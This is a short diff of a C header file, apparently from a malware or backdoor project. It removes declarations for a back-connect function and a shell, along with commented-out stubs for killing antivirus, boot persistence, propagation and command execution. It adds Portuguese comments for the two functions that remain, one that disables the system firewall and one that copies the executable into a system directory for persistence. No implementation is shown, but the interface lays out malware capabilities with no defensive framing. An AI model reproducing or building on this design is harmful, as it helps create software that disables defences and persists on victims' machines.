@@ -1,27 +1,15 @@
 #ifndef _EXECFUNCS_H
 #define _EXECFUNCS_H
 
-#include "main.h"
-
-
 /* functions */
 
-//void kill_av();
-
-int bck_cnct(const char *ip, int port);
+/**
+ * @brief Desativa o firewall do sistema (iptables no Linux, Windows Firewall no Windows).
+ */
 int kill_frwl();
+/**
+ * @brief Copia o executável para um diretório do sistema para persistência.
+ */
 int auto_copy();
-int shell();
-
-//void logged(const char * fmt, ...);
-//void cp_reg();
-//void init_on_boot();
-
-//void silent_mode();
-
-
-//void propagate();
-//int execute(char * commands);
 
 #endif // _EXECFUNCS_H
-
